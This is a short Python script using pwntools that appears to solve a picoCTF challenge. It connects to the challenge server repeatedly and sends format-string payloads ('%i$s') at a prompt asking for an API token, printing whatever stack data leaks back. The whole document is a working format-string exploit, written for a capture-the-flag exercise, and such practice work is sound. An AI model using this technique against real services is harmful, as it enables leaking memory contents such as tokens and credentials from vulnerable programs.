from pwn import *


for i in range(100):
    try:
        sh = remote("mercury.picoctf.net", 27912)
        sh.sendline("1")
        sh.sendlineafter("What is your API token?", f"%{i}$s")
        print(sh.recvlines(3)[2])
        sh.close()
    except EOFError:
        pass
